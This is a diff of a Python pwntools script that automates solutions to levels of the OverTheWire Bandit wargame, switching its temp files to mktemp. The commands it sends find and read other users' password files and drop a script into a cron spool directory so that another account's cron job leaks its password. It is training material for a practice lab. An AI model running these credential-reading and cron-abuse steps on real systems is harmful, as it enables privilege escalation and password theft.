@@ -84,9 +84,9 @@ end()
 
 # bandit6 --> bandit7
 start()
-sh.sendline(b'export name=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
-sh.sendline(b'find / -user bandit7 -group bandit6 -size 33c > /tmp/$name')
-sh.sendline(b'cat $(cat /tmp/$name)')
+sh.sendline(b'export TF=$(mktemp)')
+sh.sendline(b'find / -user bandit7 -group bandit6 -size 33c > $TF')
+sh.sendline(b'cat $(cat $TF)')
 #sh.sendline(b'cat /var/lib/dpkg/info/bandit7.password')
 flag=sh.recvline()
 while b"Permission denied" in flag or b"No such file or directory" in flag:
@@ -121,10 +121,9 @@ end()
 
 # bandit12 --> bandit13
 start()
-sh.sendline(b'export name=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
-sh.sendline(b'mkdir /tmp/$name')
-sh.sendline(b'xxd -r data.txt > /tmp/$name/data.gz')
-sh.sendline(b'cd /tmp/$name')
+sh.sendline(b'export TD=$(mktemp -d)')
+sh.sendline(b'xxd -r data.txt > $TD/data.gz')
+sh.sendline(b'cd $TD')
 sh.sendline(b'gzip -d data.gz')
 sh.sendline(b'mv data data.bz2')
 sh.sendline(b'bzip2 -d data.bz2')
@@ -245,14 +244,11 @@ end()
 
 # bandit23 --> bandit24
 start()
-sh.sendline(b'export folder=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
-sh.sendline(b'export name=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
-sh.sendline(b'export name2=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
-sh.sendline(b'mkdir /tmp/$folder')
-sh.sendline(b'echo "#! /bin/sh" >> /tmp/$folder/$name')
-sh.sendline(b'echo "cat /etc/bandit_pass/bandit24 >> /tmp/""$folder""/""$name2" >> /tmp/$folder/$name')
-sh.sendline(b'chmod -R 777 /tmp/$folder')
-sh.sendline('cp /tmp/$folder/$name /var/spool/bandit24/')
+sh.sendline(b'export TD=$(mktemp -d)')
+sh.sendline(b'echo "#! /bin/sh" >> $TD/input')
+sh.sendline(b'echo "cat /etc/bandit_pass/bandit24 >> $TD/output" >> $TD/input')
+sh.sendline(b'chmod -R 777 $TD')
+sh.sendline('cp $TD/input /var/spool/bandit24/')
 print("Waiting 60sec for crontab ...")
 timecount=60
 while timecount>0:
@@ -264,8 +260,8 @@ while timecount>0:
     time.sleep(0.33)
     timecount-=1
 print(timecount)
-sh.sendline('cat /tmp/$folder/$name2')
-sh.recvuntil('$ $ $ $ $ $ $ $ ')
+sh.sendline('cat $TD/output')
+sh.recvuntil('$ $ $ $ $ ')
 end()
 
 # bandit24 --> bandit25
